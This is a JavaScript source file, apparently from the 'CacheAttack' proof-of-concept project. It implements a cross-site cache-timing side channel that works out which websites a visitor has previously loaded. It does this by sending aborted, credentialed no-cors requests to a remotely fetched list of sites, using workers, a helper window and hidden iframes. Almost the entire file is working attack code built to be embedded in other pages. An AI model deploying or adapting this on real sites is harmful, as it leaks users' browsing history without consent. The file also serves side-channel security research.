/*jshint esversion: 8 */

// NDev 2020 https://github.com/NDevTK/CacheAttack
const firefox = navigator.userAgent.includes("Firefox");

const max = 10.5;

if (self.document === undefined) {
    onmessage = async e => {
        await ifCachedWorker(e.data, result => postMessage(result));
        postMessage("done");
    };
}

async function getWebsites(cb = false, websites = null) {
    var output = [];
    if (websites === null) {
        websites = await getRules();
    }
    let checks = chunk(websites, Math.ceil(websites.length / navigator.hardwareConcurrency));
    await PromiseForeach(checks, async chunk => {
        let worker = new Worker("https://cache.ndev.tk/embed.js");
        worker.postMessage(chunk);
        await new Promise(resolve => {
            worker.onmessage = e => {
                if (e.data === "done") resolve();
                if (cb) {
                    cb(e.data);
                } else {
                    output.push(e.data);
                }
            };
        });
        worker.terminate();
    }, 600);
    return [...new Set(output)];
}

async function PromiseForeach(item, callback, delay = 0) {
    var jobs = [];
    for (let x of item) {
        await new Promise(resolve => setTimeout(resolve, delay));
        jobs.push(callback(x));
    }
    await Promise.all(jobs);
}

function chunk(array, size) {
    const chunked_arr = [];
    for (let i = 0; i < array.length; i++) {
        const last = chunked_arr[chunked_arr.length - 1];
        if (!last || last.length === size) {
            chunked_arr.push([array[i]]);
        } else {
            last.push(array[i]);
        }
    }
    return chunked_arr;
}

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    var body = await req.json();
    return body;
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if (res === undefined) return null;
    if (is304(res)) return true;
    return (res.transferSize !== 0);
}

async function ifCachedWorker(websites, cb, CacheTest = false) {
    if (CacheTest) {
        let TestResult = await ifCached_test();
        if (!TestResult) throw "Cache is not working :-(";
    }
    // Foreach website check if cached
    for (let website of websites) {
        let result = await ifCached(website[0]);
        if (result) {
            cb(result);
        }
    }
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    await fetch("https://ndev.tk/README.md");
    let result2 = await ifCached("https://ndev.tk/README.md");
    return (!result && result2);
}

// Will include credentials so please use a sandbox domain or my postMessage API
async function ifCached(url) {
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors",credentials: "include",signal});
    } catch (err) {
        // Website blocked by client
        clearTimeout(timeout);
    }
    clearTimeout(timeout);
    return state;
}

function WindowEvent(check = false) {
    return new Promise(resolve => {
        window.addEventListener('message', e => {
            if (check !== false && e.data !== check) return;
            resolve(e.data);
        });
    });
}

function initChecker() {
    checker = open("https://cache.ndev.tk/window.html");
}

// Currently fails if not in loop
async function ifCached_window(url) {
    checker.postMessage(url);
    let event = await WindowEvent();
    if (event === "load") {
        return console.log("Wrong state");
    }
    if (event) {
        checker.location = "https://cache.ndev.tk/window.html";
    }
    await WindowEvent("load");
    if (firefox) await new Promise(resolve => setTimeout(resolve, 50));
    return event;
}

async function block(url) {
    for (;;) {
        if (checker.closed) location.reload();
        checker.postMessage(url[0]);
        checker.location = "https://cache.ndev.tk/window.html";
        await WindowEvent();
    }
}

function blockerFrame(url) {
    if (document.getElementById("ifrm")) {
        ifrm.src = "https://cache.ndev.tk/window.html";
        return;
    }
    var ifrm = document.createElement("iframe");
    ifrm.setAttribute("src", url);
    ifrm.id = "ifrm";
    ifrm.hidden = true;
    document.body.appendChild(ifrm);
}
